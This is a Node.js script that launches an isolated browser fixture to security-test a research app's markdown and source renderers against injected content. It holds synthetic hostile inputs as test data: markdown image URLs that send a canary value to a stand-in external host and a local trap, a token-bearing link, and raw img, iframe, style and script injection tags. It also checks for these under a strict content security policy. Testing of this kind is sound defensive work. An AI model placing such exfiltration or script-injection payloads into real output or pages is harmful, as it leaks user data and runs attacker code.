// 隔离的人工/Computer Use 浏览器验收页；不载入业务 App，不访问数据库或真实 API。
import { createServer as createHttpServer } from 'node:http'
import { writeFile } from 'node:fs/promises'
import { fileURLToPath } from 'node:url'
import path from 'node:path'
import { createServer } from 'vite'
import react from '@vitejs/plugin-react'

const root = fileURLToPath(new URL('../', import.meta.url))
const today = new Intl.DateTimeFormat('en-CA', { timeZone:'Asia/Shanghai', year:'numeric', month:'2-digit', day:'2-digit' }).format(new Date())
const reportPath = path.resolve(root, `../docs/security/reports/${today}-public-browser.json`)
const requests = []
const trap = createHttpServer((req, res) => {
  requests.push(req.url)
  res.setHeader('Content-Type', 'image/gif')
  res.end(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'))
})
await new Promise((resolve) => trap.listen(0, '127.0.0.1', resolve))
const trapOrigin = `http://127.0.0.1:${trap.address().port}`
const canary = 'BROWSER_SECURITY_SYNTHETIC_CANARY'
const payload = {
  markdown: `依据 [7](https://example.com/report)。\n\n![公开截图](https://image.example/pixel?data=${canary})\n\n![本地截图](${trapOrigin}/pixel?data=${canary})\n\n[不安全](https://example.com/?token=${canary})\n\n<img src="${trapOrigin}/raw-image?data=${canary}" /><iframe src="${trapOrigin}/frame"></iframe><style>body{background:url(${trapOrigin}/css)}</style><script>window.__SECURITY_EXECUTED__=true</script>`,
  sources: [{ id: 'source_7', index: 7, url: 'https://example.com/report', title: '合成公开财报', summary: '正常来源摘要' }],
  trapOrigin,
  canary,
}
const data = JSON.stringify(payload).replaceAll('<', '\\u003c')
const html = `<!doctype html><html lang="zh"><head><meta charset="utf-8"><title>公共输出安全验收</title></head><body>
<h1>隔离公共输出安全验收</h1><main id="fixture"></main><button id="positive">验证请求记录器</button><button id="record">记录验收证据</button><pre id="evidence">等待操作</pre>
<script type="module">
import React from 'react'; import { createRoot } from 'react-dom/client';
import { ResearchMarkdown } from '/src/components/research/research-markdown.tsx';
import { ResearchSources } from '/src/components/research/research-sources.tsx';
const data = ${data}; const violations = []; let controlLoaded = false;
document.addEventListener('securitypolicyviolation', event => violations.push({ directive: event.effectiveDirective, blocked: event.blockedURI }));
createRoot(document.getElementById('fixture')).render(React.createElement(React.Fragment, null,
  React.createElement(ResearchMarkdown, { mode:'static', isAnimating:false, sources:data.sources }, data.markdown),
  React.createElement(ResearchSources, { sources:data.sources, content:data.markdown })));
document.getElementById('positive').onclick = () => { const image = new Image(); image.onload = () => { controlLoaded = true; document.getElementById('evidence').textContent = '请求记录器正向对照已加载'; }; image.src=data.trapOrigin+'/control.gif'; };
document.getElementById('record').onclick = async () => {
 const snapshot = { forbiddenElements:document.querySelectorAll('main img,main iframe,main video,main audio,main object,main embed,main style,main script').length,
 unsafeLinks:[...document.querySelectorAll('main a[href]')].map(a=>a.href).filter(url=>/[?&#](?:token|api_key)=/i.test(url)||url.startsWith(data.trapOrigin)),
 manualImageLink:!![...document.querySelectorAll('main a')].find(a=>a.textContent==='打开图片'),
 violations, controlLoaded, scriptExecuted:!!window.__SECURITY_EXECUTED__ };
 const response=await fetch('/__security_evidence',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(snapshot)});
 document.getElementById('evidence').textContent=JSON.stringify(await response.json(),null,2);
};
</script></body></html>`

let server
const handleFixture = async (req, res, next) => {
  if (req.url === '/__security_fixture.html') {
    res.setHeader('Content-Type', 'text/html; charset=utf-8')
    // 防止验收素材真的向外站发送请求；任何被拦截的尝试也必须计为失败。
    res.setHeader('Content-Security-Policy', `default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src ${trapOrigin}; frame-src 'none'; object-src 'none'; connect-src 'self' ws://127.0.0.1:*`)
    res.end(await server.transformIndexHtml(req.url, html))
  } else if (req.url === '/__security_evidence' && req.method === 'POST') {
    const chunks = []
    for await (const chunk of req) chunks.push(chunk)
    const snapshot = JSON.parse(Buffer.concat(chunks).toString())
    const report = { date: today, fixture_version:'2026-11-03', recorded_at:new Date().toISOString(), environment: '隔离真实浏览器、合成素材、本地请求记录器', ...snapshot,
      automaticRequests: requests.filter(url => !url.startsWith('/control.gif')),
      positiveControlRequests: requests.filter(url => url.startsWith('/control.gif')).length }
    report.passed = report.forbiddenElements === 0 && report.unsafeLinks.length === 0 && report.manualImageLink && report.violations.length === 0 && report.controlLoaded && !report.scriptExecuted && report.automaticRequests.length === 0 && report.positiveControlRequests > 0
    await writeFile(reportPath, JSON.stringify(report, null, 2) + '\n')
    res.setHeader('Content-Type', 'application/json')
    res.end(JSON.stringify(report))
  } else if (req.url?.startsWith('/api')) {
    res.statusCode = 404; res.end('fixture_has_no_business_api')
  } else next()
}

server = await createServer({
  configFile: false, root, plugins: [react(), { name: "security-fixture", configureServer(vite) { vite.middlewares.use(handleFixture) } }], resolve: { alias: { '@': path.join(root, 'src') } },
  server: { host: '127.0.0.1', port: 5199, strictPort: true },
})

await server.listen()
await writeFile('/private/tmp/bsagent-public-security-fixture.json', JSON.stringify({ url:'http://127.0.0.1:5199/__security_fixture.html', trapOrigin, reportPath }))
console.log('安全验收页面：http://127.0.0.1:5199/__security_fixture.html')
console.log('仅合成数据；通过后关闭浏览器页并终止此进程。')
const close = async () => { await server.close(); trap.close(); process.exit(0) }
process.on('SIGINT', close); process.on('SIGTERM', close)
